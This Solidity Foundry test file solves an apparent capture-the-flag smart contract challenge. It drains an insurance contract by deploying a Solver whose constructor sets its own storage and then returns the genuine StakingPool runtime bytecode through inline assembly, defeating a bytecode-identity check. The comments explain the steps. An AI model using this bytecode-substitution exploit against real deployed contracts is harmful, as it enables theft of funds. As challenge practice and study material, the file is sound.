// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Challenge, StakingPool} from "../src/ETHStaking/Challenge.sol";

// In this task, we need to empty the insurance contract. We can do this through the `requestCompensation` function. However, to do this, one needs to be on the `protectedContracts` list, which can be achieved by calling the `registerContract` function. This function includes a check to ensure that `msg.sender` has identical bytecode to the StakingPool contract. Therefore, we must analyze the StakingPool code to find possible vulnerabilities.

// To withdraw funds from the `Insurance` contract, we need to invoke the `endOperatorService` function, which can only be called in the `Validating` state. To transition the contract to this state, one must call the `createValidator` function, and so on. You can follow the chain and come to the conclusion that it's impossible : )

// What can we do about this?
// To successfully call the `endOperatorService` function, we need the `Validating` state and pass the following check:
// ```
// require(
//     (msg.sender == operator && block.timestamp > exitDate) ||
//     (deposits[msg.sender] > 0 && block.timestamp > exitDate + MAX_SECONDS_IN_EXIT_QUEUE),
//     "Permission denied or wrong time"
// );
// ```

// We can see that the first part of the expression (before the `||` sign) cannot be satisfied by us, as we cannot be the operator; this limitation comes from the Insurance contract here:
// ```
// require(StakingPool(payable(msg.sender)).operator() == operator, "Invalid operator");
// ```

// This means our balance must be positive and 12 weeks must have passed.

// Without delving into lengthy explanations, the final solution to pass this check is:
// We can deploy our own StakingPool with a positive balance for our account and the Validation state. However, if we simply add changes to these variables in the constructor, the bytecode will not match the original StakingPool.

// Here, we can resort to a trick and substitute the contract's bytecode in the constructor. This is possible because the final bytecode of the contract is implicitly returned at the end of the constructor's execution. We can achieve this using inline assembly.
// Therefore, all we need to do is modify the variables in the constructor and return the StakingPool bytecode.

contract ETHStakingTest is Test {
    Challenge private challenge;
    Solver private solver;

    function setUp() external {
        skip(123123123); // Set block.timestamp (foundry has small default block.timestamp, that is less than 12 weeks)

        challenge = new Challenge{value: 10 ether}();
        solver = new Solver(address(challenge), address(challenge.insurance()));
    }

    function test_hackETHStaking() public {
        solver.registerInsurance();
        solver.endOperatorService();

        assertTrue(challenge.isSolved());
    }
}

// Inherit from StakingPool to save the storage layout
contract Solver is StakingPool {
    constructor(address _operator, address _insurance) StakingPool(_operator, _insurance) {
        // To pass the `deposits[msg.sender] > 0` check in `endOperatorService` function
        deposits[msg.sender] = 1;
        // To pass the `state == State.Validating` check in `endOperatorService` and `registerInsurance` functions
        state = State.Validating;

        // Return the same bytecode with `StakingPool`
        bytes memory code = type(StakingPool).runtimeCode;
        assembly {
            return(add(code, 0x20), mload(code))
        }
    }
}
